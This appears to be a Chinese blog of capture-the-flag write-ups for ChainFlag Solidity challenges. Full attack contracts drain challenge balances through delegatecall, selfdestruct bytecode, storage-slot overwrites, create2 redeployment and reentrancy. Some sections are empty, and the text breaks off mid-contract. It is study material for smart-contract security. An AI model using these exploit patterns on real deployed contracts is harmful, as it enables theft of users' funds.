&#123; mstore(0x80, owner) log1(0x80, 0x20, add(eventHash, v)) &#125; &#125;&#125;// deploy contractcontract Deployer &#123; function deploy(uint salt) external returns(address) &#123; bytes32 _salt = keccak256(abi.encodePacked(salt)); bytes memory bytecode = hex&quot;6080604052348015600f57600080fd5b50608280601d6000396000f3fe6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000fea265627a7a723158204625f66260f1fdaf525f42f693a093d7d82bc23c20de4f2d6993a2391b1a2bcf64736f6c63430005110032&quot;; address hacker; assembly &#123; hacker := create2(0, add(bytecode, 0x20), mload(bytecode), _salt) &#125; return hacker; &#125;&#125; 成功触发ForFlag EasySandbox1. question源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364pragma solidity ^0.5.10;contract EasySandbox &#123; uint256[] public writes; mapping(address =&gt; address[]) public sons; address public owner; uint randomNumber = 0; constructor() public payable &#123; owner = msg.sender; sons[msg.sender].push(msg.sender); writes.length -= 1; &#125; function given_gift(uint256 _what, uint256 _where) public &#123; if(_where != 0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9f) &#123; writes[_where] = _what; &#125; &#125; function easy_sandbox(address _addr) public payable &#123; require(sons[owner][0] == owner); require(writes.length != 0); bool mark = false; for(uint256 i = 0; i &lt; sons[owner].length; i++) &#123; if(msg.sender == sons[owner][i]) &#123; mark = true; &#125; &#125; require(mark); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; bool success; bytes memory _; (success, _) = _addr.delegatecall(&quot;&quot;); require(success); require(writes.length == 0); require(sons[owner].length == 1 &amp;&amp; sons[owner][0] == tx.origin); &#125; // patch function isSolved() public view returns (bool) &#123; return address(this).balance == 0; &#125;&#125; 将合约中的钱盗取。 2. analysis 前置知识：在delegatecall中，logic合约的数据不会改变，改变的是proxy合约中的数据，address(this).banlance同样如此，所以本题可以通过(success, _) = _addr.delegatecall(&quot;&quot;);这条语句，将EasySandbox合约的钱掏空。 分析easy_sandbox函数，前两个断言不需要不需要动脑经，看到第三个断言，需要将msg.sender加入到sons[owner][i]中，这里可以通过writes[]数组进行覆盖，初始化的时候该数组长度被设置为type(uint).max，given_gift()函数为覆盖提供可行性。 所以要计算出，sons[owner]所对应动态数组长度的所在索引，以及，sons[owner][1]所在的索引。计算思路如下： 1234567# cal index of sons[owner].lengthslot_length = keccak256(owner,1) idx_length = slot_length - keccak256(0)# cal index of sons[owner][0]slot_Arr_0 = keccak256(keccak256(owner,1))idx_Arr_0 = slot_Arr_0 - keccak256(0) 看到，如下代码 1234567assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size)&#125; 很熟悉，意思就是将_addr的runtimecode拷贝下来，将其赋值给code，接下来循环语句和上一题很类似，即不能出现0xf0 0xf1 0xf2 0xf4 0xfa 0xff，这很可能需要编辑bytecode，然后通过create2创建合约。 往下分析最后的三个断言，可得到的想法为 1234567/* 1. hacker合约的逻辑处理需要在回调函数中完成； 2. 确保合约成功调用； 3. 修改writes.length，该值位于slot0, sstore(0,0)就ok了； 4. 修改sons[owner]对应动态数组的长度为1，sstore(keccak256(owner||1),1) 5. 耗尽address(this).banlance --&gt; create2 */ 按要求可得到攻击合约如下 123456789101112131415161718192021222324contract EasySandboxHelper &#123; function() external &#123; assembly &#123; // set writes.length == 0 sstore(0, 0) // set sons[owner].length = 1 let idx_sons_owner_length := 0x9d4d959825f0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4 sstore(idx_sons_owner_length, 1) // set sons[owner][0] == tx.origin let idx_sons_owner_0 := 0x94b29c01ed483e694a7ecf386d384987d4d3e9d4e6c476f5b97302b23ff871c9 //ff is 32 f8 sstore(idx_sons_owner_0, origin()) // exhaust address(this).balance mstore(0x200, shl(239, shl(1, add(0x32FE,0x1)))) let hacker := create2(selfbalance(), 0x200, 2, 0) &#125; &#125;&#125; 我是在复现，所以题中部署的owner是0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2，对其进行keccak256(owner,1) 计算时，出现了F0，所以要对其进行相加 123let idx_sons_owner_length := 0x9d4d959825e0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4let tem := 0x100000000000000000000000000000000000000000000000000000sstore(add(idx_sons_owner_length, tem), 1) 前面几个修改值还是很容易实现的，有趣的是，如何将合约的钱掏空，我最开始想到的是使用call，但是好奇不巧，call的序号为F1，随后看到大佬的题解，采用了create2，同时还将合约的钱转回了自己的账户，我直接看呆了，后面仔细分析，最后借鉴了这波操作。 123// exhaust address(this).balancemstore(0x200, shl(239, shl(1, add(0x32FE,0x1))))let hacker := create2(selfbalance(), 0x200, 2, 0) 📌细品 使用0x32FF这两个字节作为bytcode创建合约，其含义为selfdestruct(tx.origin)，我第一次见还可以这样创建合约的，直接自毁，又由于FF被禁止使用，所以采用了add(0x32FE,0x1)，随后将0x32FF移动到32bytes的高16位。 12345/* 左移240位的原因： 对于一段bytecode，EVM的读取方式为从左到右，即从高位到低位， mstore(offset, value) 存储方式为低位存储，高位留空，且存储的大小为32bytes即256位，0x32FF占了4*4=16(bit)，所以需要左移 32bytes(256bit) - 16bit = 240(0XF0)bit */ 最后，如果在metadata部分出现了被限制的字节，可以像BoxGame那样，修改return的字节长度。将最终的bytecode通过create2创建出来即可用来完成pwn。 3. solve攻击合约 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192/* realize fallback */contract EasySandboxHelper &#123; function() external &#123; assembly &#123; // set writes.length == 0 sstore(0, 0) // set sons[owner].length = 1 /* set owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2 destination = 0x9d4d959825f0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4 = 0x9d4d959825e0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4 + 0x100000000000000000000000000000000000000000000000000000 */ let idx_sons_owner_length := 0x9d4d959825e0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4 let tem := 0x100000000000000000000000000000000000000000000000000000 sstore(add(idx_sons_owner_length, tem), 1) // set sons[owner][0] == tx.origin let idx_sons_owner_0 := 0x94b29c01ed483e694a7ecf386d384987d4d3e9d4e6c476f5b97302b23ff871c9 //ff is 32 f8 sstore(idx_sons_owner_0, origin()) // exhaust address(this).balance mstore(0x200, shl(239, shl(1, add(0x32FE,0x1)))) let hacker := create2(selfbalance(), 0x200, 2, 0) &#125; &#125;&#125;/* realize attack*/contract EasySandboxHacker &#123; EasySandbox box; Calculation cal; address helper; constructor(address _box) public &#123; box = EasySandbox(_box); cal = new Calculation(); bytes memory bytecode = hex&quot;6080604052348015600f57600080fd5b50609a8061001e6000396000f3fe6080604052348015600f57600080fd5b50600080557f9d4d959825e0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a47a1000000000000000000000000000000000000000000000000000006001818301557f94b29c01ed483e694a7ecf386d384987d4d3e9d4e6c476f5b97302b23ff871c932815560016132fe0160011b60ef1b610200526000600261020047f55050505000fea265627a7a7231582023a73df8d65ef946e0bdd1fb3d5b829c0dcaa1a4e38382baac32981b896977f464736f6c63430005110032&quot;; address addr; assembly &#123; addr := create2(0, add(bytecode, 0x20), mload(bytecode), 0) &#125; helper = addr; &#125; function pwn() public &#123; // First, get owner address box_owner = box.owner(); // 1. set sons[owner].length = 2 uint idx1 = uint(cal.calIdxOf_Arr(box_owner)) - uint(keccak256(abi.encodePacked(uint(0)))); box.given_gift(2, idx1); // 2. set sons[owner][1] = msg.sender uint idx2 = uint(cal.calArr0(box_owner)) - uint(keccak256(abi.encodePacked(uint(0)))); box.given_gift(uint(address(this)), idx2 + 1); console.log(&quot;given_gift2&quot;); // 3. call easy_sandbox() to exhaust the balance box.easy_sandbox(address(helper)); // 4. determine is not solving require(box.isSolved(), &quot;You don&#x27;t solve the challenge...&quot;); &#125;&#125;/*calculation*/contract Calculation &#123; // 计算 owner =&gt; address[] 数组长度所在的位置 function calIdxOf_Arr(address owner) public returns(bytes32) &#123; return keccak256(abi.encode(owner, uint(1))); &#125; // 计算 address[0]所在位置 function calArr0(address owner) public returns (bytes32) &#123; return keccak256(abi.encodePacked(calIdxOf_Arr(owner))); &#125; &#125; StArNDBOX1. question源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138pragma solidity ^0.5.11;library Math &#123; function invMod(int256 _x, int256 _pp) internal pure returns (int) &#123; int u3 = _x; int v3 = _pp; int u1 = 1; int v1 = 0; int q = 0; while (v3 &gt; 0)&#123; q = u3/v3; u1= v1; v1 = u1 - v1*q; u3 = v3; v3 = u3 - v3*q; &#125; while (u1&lt;0)&#123; u1 += _pp; &#125; return u1; &#125; function expMod(int base, int pow,int mod) internal pure returns (int res)&#123; res = 1; if(mod &gt; 0)&#123; base = base % mod; for (; pow != 0; pow &gt;&gt;= 1) &#123; if (pow &amp; 1 == 1) &#123; res = (base * res) % mod; &#125; base = (base * base) % mod; &#125; &#125; return res; &#125; function pow_mod(int base, int pow, int mod) internal pure returns (int res) &#123; if (pow &gt;= 0) &#123; return expMod(base,pow,mod); &#125; else &#123; int inv = invMod(base,mod); return expMod(inv,abs(pow),mod); &#125; &#125; function isPrime(int n) internal pure returns (bool) &#123; if (n == 2 ||n == 3 || n == 5) &#123; return true; &#125; else if (n % 2 ==0 &amp;&amp; n &gt; 1 )&#123; return false; &#125; else &#123; int d = n - 1; int s = 0; while (d &amp; 1 != 1 &amp;&amp; d != 0) &#123; d &gt;&gt;= 1; ++s; &#125; int a=2; int xPre; int j; int x = pow_mod(a, d, n); if (x == 1 || x == (n - 1)) &#123; return true; &#125; else &#123; for (j = 0; j &lt; s; ++j) &#123; xPre = x; x = pow_mod(x, 2, n); if (x == n-1)&#123; return true; &#125;else if(x == 1)&#123; return false; &#125; &#125; &#125; return false; &#125; &#125; function gcd(int a, int b) internal pure returns (int) &#123; int t = 0; if (a &lt; b) &#123; t = a; a = b; b = t; &#125; while (b != 0) &#123; t = b; b = a % b; a = t; &#125; return a; &#125; function abs(int num) internal pure returns (int) &#123; if (num &gt;= 0) &#123; return num; &#125; else &#123; return (0 - num); &#125; &#125; &#125;contract StArNDBOX&#123; using Math for int; constructor()public payable&#123; &#125; modifier StAr() &#123; require(msg.sender != tx.origin); _; &#125; function StArNDBoX(address _addr) public payable&#123; uint256 size; bytes memory code; int res; assembly&#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; res = int(uint8(code[i])); require(res.isPrime() == true); &#125; bool success; bytes memory _; (success, _) = _addr.delegatecall(&quot;&quot;); require(success); &#125; // patch function isSolved() public view returns (bool) &#123; return address(this).balance == 0; &#125;&#125; 📌 目标：将合约的钱掏空 2. analysis 和上一题类似，也是要通过delegatecall将合约的余额掏空，但是要求_addr的runtimecode的字节全是质数，而质数的限制太多了，可以构造runtime字节码，和BoxGame有点类似，在constructor中返回即可。而runtimecode被部署到链上，是可以被调用的逻辑，只要将runtimecode的设置为将本合约的balance全部转走即可。最有用的两个opcode就是push2（0x61）以及call（0xf1） 123456789/* call(g, a, v, in, insize, out, outsize) // g是可用的gas数量，a是要调用的合约地址，v是要发送的以太币数量，in是要发送的调用数据， // insize是调用数据的长度，out是一个指向输出缓冲区的指针，outsize是输出缓冲区的大小 // 入栈的顺序为： outsize -&gt; out -&gt; insize -&gt; in -&gt; v -&gt; a -&gt; g -&gt; call // msg.sender(0x33), tx.origin(0x32) is not prime // set value =&gt; outsize=0, out=0, insize=0, in=0, v=0x47(SELFBALANCE()), a=address(0), gas=FBFB // push1(0x60) is not prime, push2(0x61) is prime*/ 将上述操作换做opcde为 12345678// PUSH2 0000 610000 // outsize// PUSH2 0000 610000 // out// PUSH2 0000 610000 // insize// PUSH2 0000 610000 // in// selfbalance() 47 47 // value// PUSH2 0000 610000 // address// PUSH2 FBFB 61FBFB// gas// CALL F1 F1 // opcode runtimecode为： 10x6100006100006100006100004761000061FBFBF1 3. solve攻击合约 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152contract StArNDBOXHacker &#123; StArNDBOX box; constructor(address _box) public &#123; box = StArNDBOX(_box); &#125; function pwn() external &#123; // steal the balance of box box.StArNDBoX(address(new StArNDBOXHelper())); // slove require(box.isSolved(), &quot;You don&#x27;t solve the challenge...&quot;); &#125;&#125;contract StArNDBOXHelper &#123; constructor() public &#123; /* call(g, a, v, in, insize, out, outsize) =&gt; exhaust the money // g是可用的gas数量，a是要调用的合约地址，v是要发送的以太币数量，in是要发送的调用数据， // insize是调用数据的长度，out是一个指向输出缓冲区的指针，outsize是输出缓冲区的大小 // 入栈的顺序为： outsize -&gt; out -&gt; insize -&gt; v -&gt; a -&gt; g -&gt; call // msg.sender(0x33), tx.origin(0x32) is not prime // set value =&gt; outsize=0, out=0, insize=0, v=0x47(SELFBALANCE()), a=address(0), gas= // push1(0x60) is not prime, push2(0x61) is prime // PUSH2 0000 610000 // outsize // PUSH2 0000 610000 // out // PUSH2 0000 610000 // insize // PUSH2 0000 610000 // in // selfbalance() 47 47 // value // PUSH2 0000 610000 // address // PUSH2 FBFB 61FBFB// gas // CALL F1 F1 // opcode */ bytes memory runtimecode = hex&quot;6100006100006100006100004761000061FBFBF1&quot;; assembly &#123; return(add(runtimecode, 0x20), mload(runtimecode)) &#125; &#125;&#125; AcoraidaMonica1. question源码 1234567891011121314151617```&gt; ### 2. analysis&gt; ### 3. solve## Re-Montagy### 1. question**源码**```solidity 2. analysis 3. solveCreativity1. question源码 1234567891011121314151617181920212223242526pragma solidity ^0.5.10;contract Creativity &#123; event SendFlag(address addr); address public target; uint randomNumber = 0; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function execute() public &#123; require(target != address(0)); target.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(address(0)); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); &#125;&#125; 触发SendFlag事件 2. analysis 这题有点类似：EKO的 phoenixtto，原理是相同的合约地址，具有不同的逻辑功能。 哎，离谱得很。 分析：要触发SendFlag事件，显然需要通过execute函数，该函数通过delegatecall调用target。而target需要通过check设置，限制了合约代码长度不超过4个字节。但是4个字节显然不能实现触发事件的功能，这里是看大佬的题解 这里使用create2的一个小技巧，可以让不同的字节码部署到同一个地址。可以先部署一个只具有自毁功能的合约，即只具备四个字节(0x32FF)selfdestrct(tx.origin)这样一来就可以通过check将参数赋值给target，返回通过低级调用，让该合约自毁（保证create2正常执行），最后通过create2在同一个地址创建触发SendFlag事件的合约，在执行execute函数即可。 实现同一地址，具有不同功能的代码（借鉴大佬的） 123456789101112131415161718192021222324contract Deployer &#123; bytes public deployBytecode; // code is Logic contract&#x27;s bytecode function deploy(bytes memory code) public returns(address addr) &#123; deployBytecode = code; address a; // Compile Dumper to get this bytecode bytes memory dumperBytecode = type().creationCode; assembly &#123; addr := create2(callvalue(), add(0x20, dumperBytecode), mload(dumperBytecode), 0x1030) &#125; &#125;&#125;contract Dumper &#123; constructor() &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; 注意：_addr都是通过Deployer合约创建的，而且调用deploy函数的两次传参分别是具有自毁功能的 这里我发现了一个很奇怪的东西，为什么把两步create2操作和空调用放在同一个函数中不行（call(“”)会失败，即无法将合约回调），至今还没搞懂，只有将他们分开才可以hack成功。错误代码： 123456789101112131415161718function pwn() external &#123; // 1. deploy selfdestruct contract bytes memory destructCode = hex&quot;32FF&quot;; // selfdestruct(tx.origin) address destruct_addr = deployer.deploy(destructCode); // 2. set target = destuct_addr creativity.check(destruct_addr); // 3. destruct the contract destruct_addr.call(&quot;&quot;); // 4. deploy sendflag contract deployer.deploy(type(CreativitySendFlag).runtimeCode); // 5. emit the SendFlag creativity.execute();&#125; 将他们三拆开才能成功。 3. solve攻击合约 &#x3D;&#x3D;&gt; 攻击逻辑：部署Hacker合约，依次执行pwn1()，pwn2()，pwn3() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192// selfdestruct(tx.origin)contract CreativityDestruct &#123; constructor() public &#123; assembly &#123; mstore(0x200, shl(240, 0x32FF)) return (0x200, 4) &#125; &#125;&#125;// emit SendFlagcontract CreativitySendFlag &#123; function() external &#123; bytes32 eventHash = keccak256(abi.encodePacked(&quot;SendFlag(address)&quot;)); address hacker = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; assembly &#123; mstore(0x200, hacker) log1(0x200, 0x20, eventHash) &#125; &#125;&#125;// be responsible for creating contractcontract Deployer &#123; bytes public deployBytecode; // code is Logic contract&#x27;s bytecode function deploy(bytes memory code) public returns(address addr) &#123; deployBytecode = code; // Compile Dumper to get this bytecode bytes memory dumperBytecode = type(Dumper).creationCode; assembly &#123; addr := create2(0, add(0x20, dumperBytecode), mload(dumperBytecode), 0x1030) &#125; &#125;&#125;// the function is assigning different functionscontract Dumper &#123; constructor() public &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125;contract CreativityHacker &#123; Creativity creativity; Deployer deployer; constructor(address _creativity) public &#123; creativity = Creativity(_creativity); deployer = new Deployer(); &#125; address addr; function pwn1() external &#123; // 1. deploy selfdestruct contract bytes memory destructCode = hex&quot;32FF&quot;; addr = deployer.deploy(destructCode); // 2. set target = destuct_addr creativity.check(addr); &#125; function pwn2() external &#123; // 3. destruct the contract addr.call(&quot;&quot;); &#125; function pwn3() external &#123; // 4. deploy sendflag contract deployer.deploy(type(CreativitySendFlag).runtimeCode); // 5. emit the SendFlag creativity.execute(); &#125;&#125; 总结 BoxGame 知道了汇编log1的用法，以及加深了对bytecode的认知，metadata的有无不影响合约的部署。 EasySandbox 在这题中，我知道了delegatecall的另一个特点，逻辑合约的转账操作，在代理合约中通过delegatecall调用，实际上操作的是代理合约中的余额，如下所示： 首先，在部署proxy时，已经给proxy转了1ether 结果显示，执行完delegatecall函数之后，proxy中的钱被转走了。 123// exhaust address(this).balancemstore(0x200, shl(239, shl(1, add(0x32FE,0x1))))let hacker := create2(selfbalance(), 0x200, 2, 0) 使用0x32FF这两个字节作为bytcode创建合约，其含义为selfdestruct(tx.origin)，我第一次见还可以这样创建合约的，直接自毁，又由于FF被禁止使用，所以采用了add(0x32FE,0x1)，随后将0x32FF移动到32bytes的高16位。 12345/* 左移240位的原因： 对于一段bytecode，EVM的读取方式为从左到右，即从高位到低位， mstore(offset, value) 存储方式为低位存储，高位留空，且存储的大小为32bytes即256位，0x32FF占了4*4=16(bit)，所以需要左移 32bytes(256bit) - 16bit = 240(0XF0)bit*/ StArNDBOX runtimecode可以通过constructor来控制，即在构造器中使用内联汇编返回指定的runtimecode，即使合约中还有其他的函数，按理来说那些函数的功能应该是被编码在runtimecode中，如果构造器中return，则真正的runtimecode为return的值。 如下是有无构造器时的bytcode： 由结果可知，猜想正确，格局打开🤑。 Creativity 学会了如何实现同一个地址部署不同的runtimecode，真的感觉很神奇！ 在传bytes类型的数据时， 123bytes memory code = &quot;0x32FF&quot;; // 这样是错误的，读取的结果非 0x32FF// 应该这样写bytes memory code = hex&quot;32FF&quot;; 参考链接 Link1题解 Link2题解 Link3EVMruntimecode的学习 Link4metadata 很有意思的拓展学习 12345678910111213141516171819202122232425262728293031323334353637pragma solidity ^0.4.24;contract HoneyPot &#123; bytes internal constant ID = hex&quot;60203414600857005B60008080803031335AF100&quot;; constructor () public payable &#123; bytes memory contract_identifier = ID; assembly &#123; return(add(0x20, contract_identifier), mload(contract_identifier)) &#125; &#125; function withdraw() public payable &#123; require(msg.value &gt;= 1 ether); msg.sender.transfer(address(this).balance); &#125;&#125;contract HoneyPotHacker &#123; HoneyPot pot; constructor(address _pot) public &#123; pot = HoneyPot(_pot); &#125; function pwn() external payable &#123; require(msg.value == 0x20); pot.withdraw.value(msg.value)(); &#125; function balanceOf(address target) external view returns(uint) &#123; return target.balance; &#125; function() external payable&#123;&#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"defi(1)❌","slug":"CTFS/ChainFlag/defi/defi","date":"2023-08-26T07:50:10.000Z","updated":"2023-08-26T07:50:10.000Z","comments":true,"path":"2023/08/26/CTFS/ChainFlag/defi/defi/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/26/CTFS/ChainFlag/defi/defi/","excerpt":"","text":"defi — 代码量太多了1. question 2. analysis 3. solve","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"storage(5)","slug":"CTFS/ChainFlag/storage/storage(5)","date":"2023-08-26T07:10:10.000Z","updated":"2023-08-26T07:10:10.000Z","comments":true,"path":"2023/08/26/CTFS/ChainFlag/storage/storage(5)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/26/CTFS/ChainFlag/storage/storage(5)/","excerpt":"","text":"Happy_DOuble_Eleven1. question源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148pragma solidity ^0.4.23;interface Tmall &#123; function Chop_hand(uint) view public returns (bool);&#125;contract Happy_DOuble_Eleven &#123; address public owner; bool public have_money; bytes32[] public codex; bool public have_chopped; uint public hand; mapping (address =&gt; uint) public balanceOf; mapping (address =&gt; uint) public mycart; mapping (address =&gt; uint) public level; event pikapika_SendFlag(string b64email); constructor() public &#123; owner = msg.sender; &#125; function payforflag(string b64email) onlyOwner public &#123; require(uint(msg.sender) &amp; 0xfff == 0x111); require(level[msg.sender] == 3); require(mycart[msg.sender] &gt; 10000000000000000000); balanceOf[msg.sender] = 0; level[msg.sender] = 0; have_chopped = false; have_money = false; codex.length = 0; emit pikapika_SendFlag(b64email); &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; modifier first() &#123; uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function Deposit() public payable &#123; if(msg.value &gt;= 500 ether)&#123; mycart[msg.sender] += 1; &#125; &#125; function gift() first &#123; require(mycart[msg.sender] == 0); require(uint(msg.sender) &amp; 0xfff == 0x111); balanceOf[msg.sender] = 100; mycart[msg.sender] += 1; level[msg.sender] += 1; &#125; function Chopping(uint _hand) public &#123; Tmall tmall = Tmall(msg.sender); if (!tmall.Chop_hand(_hand)) &#123; hand = _hand; have_chopped = tmall.Chop_hand(hand); &#125; &#125; function guess(uint num) public &#123; uint seed = uint(blockhash(block.number - 1)); uint rand = seed % 3; if (rand == num) &#123; have_money = true; &#125; &#125; function buy() public &#123; require(level[msg.sender] == 1); require(mycart[msg.sender] == 1); require(have_chopped == true); require(have_money == true); mycart[msg.sender] += 1; level[msg.sender] += 1; &#125; function retract() public &#123; require(codex.length == 0); require(mycart[msg.sender] == 2); require(level[msg.sender] == 2); require(have_money == true); codex.length -= 1; &#125; function revise(uint i, bytes32 _person) public &#123; require(codex.length &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000); require(mycart[msg.sender] == 2); require(level[msg.sender] == 2); require(have_money == true); codex[i] = _person; if (codex.length &lt; 0xffffffffff000000000000000000000000000000000000000000000000000000)&#123; codex.length = 0; revert(); &#125; else&#123; level[msg.sender] += 1; &#125; &#125; function withdraw(uint _amount) onlyOwner public &#123; require(mycart[msg.sender] == 2); require(level[msg.sender] == 3); require(_amount &gt;= 100); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); balanceOf[msg.sender] -= _amount; msg.sender.call.value(_amount)(); mycart[msg.sender] -= 1; &#125;&#125; 📌 成功调用payforflag() 2. analysis 这道题富含的知识点比较多，涉及了：重入，溢出，create2，构造器调用者代码大小为0，动态数组的覆盖和溢出，构造伪随机数，自己给自己转钱余额翻倍涨，蛮有意思。 分析： gift() first：在构造器中调用，满足 codesize==0，且使得 mycart[msg.sender] == 1, level[msg.sender] == 1 Chopping()：攻击者可以自定义Chop_hand函数，令其满足第一次调用为false第二次调用为true即可，函数调用完成之后have_chopped=true guess()：制造伪随机数，函数调用完成之后have_money=true buy()：调用该函数，使得mycart[msg.sender] == 2, level[msg.sender] == 2 retract()：调用该函数，使得codex.length发生下溢，为接下来的owner值覆盖做铺垫 revise()：计算出数组的长度，使其+1发生上溢，覆盖掉owner，令其成为hacker withdraw：不难看出，此时的mycart[msg.sender] == 2，除了主动调用withdraw函数之外，还需要进行两次重入使其发生溢出，但是balance的变量更新在转账之前，所以需要有三倍的转账资金，不难看出，_transfer有大问题，之前在重入篇已经分析过了，就不细说了 综上便有了攻击合约 3. solve攻击合约 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Tmall &#123; function Chop_hand(uint) external returns (bool);&#125;interface IHappy_DOuble_Eleven&#123; function gift() external; function guess(uint num) external; function Chopping(uint _hand) external; function buy() external; function retract() external; function revise(uint i, bytes32 _person) external; function balanceOf(address user) external returns (uint); function transfer(address _to, uint256 _value) external returns (bool success); function withdraw(uint _amount) external; function payforflag(string memory b64email) external;&#125;contract Happy_DOuble_ElevenHacker is Tmall &#123; IHappy_DOuble_Eleven eleven; uint counter; uint fallback_counter; constructor(address _eleven) &#123; eleven = IHappy_DOuble_Eleven(_eleven); // 1. mycart[msg.sender] == 1, level[msg.sender] == 1, balanceOf[msg.sender] == 100 eleven.gift(); // create2 &#125; function pwn() external &#123; // 2. call guess() =&gt; have_money == true eleven.guess(uint(blockhash(block.number - 1)) % 3); // 3. call Chopping =&gt; have_chopped == true eleven.Chopping(0); // 4. call buy() =&gt; mycart[msg.sender] == 2, level[msg.sender] == 2 eleven.buy(); // 5. call retract() =&gt; codex.length == type(uint256).max eleven.retract(); // 6. call revise() =&gt; become owner, level[msg.sender] == 3 uint index_code_0 = uint(keccak256(abi.encodePacked(uint(1)))); // code[0]&#x27;s location uint index_owner = type(uint).max - index_code_0 + 1; // owner&#x27;s location = total - index_code_0 + 1 =&gt; slot0 eleven.revise(index_owner, bytes32(uint(uint160(address(this))))); // hacker become owner // 7. call transfer() for 2 times =&gt; balanceOf[msg.sender] = 400 for (uint i; i &lt; 2; i++) &#123; eleven.transfer(address(this), eleven.balanceOf(address(this))); &#125; // 8. make overflow =&gt; mycart[msg.sender] &gt; 10000000000000000000 eleven.withdraw(100); // 9. capture the flag eleven.payforflag(&quot;BYYQ1030&quot;); &#125; function Chop_hand(uint) external returns (bool) &#123; if (counter == 0) &#123; counter++; return false; &#125; return true; &#125; fallback() external payable &#123; if (fallback_counter &lt; 3) &#123; fallback_counter++; eleven.withdraw(100); &#125; &#125;&#125;contract Happy_DOuble_ElevenDeployer &#123; function deploy(uint _salt, address challenge) external returns (address hacker) &#123; bytes32 salt = keccak256(abi.encodePacked(_salt)); bytes memory bytecode = abi.encodePacked(type(Happy_DOuble_ElevenHacker).creationCode, abi.encode(challenge)); assembly &#123; hacker := 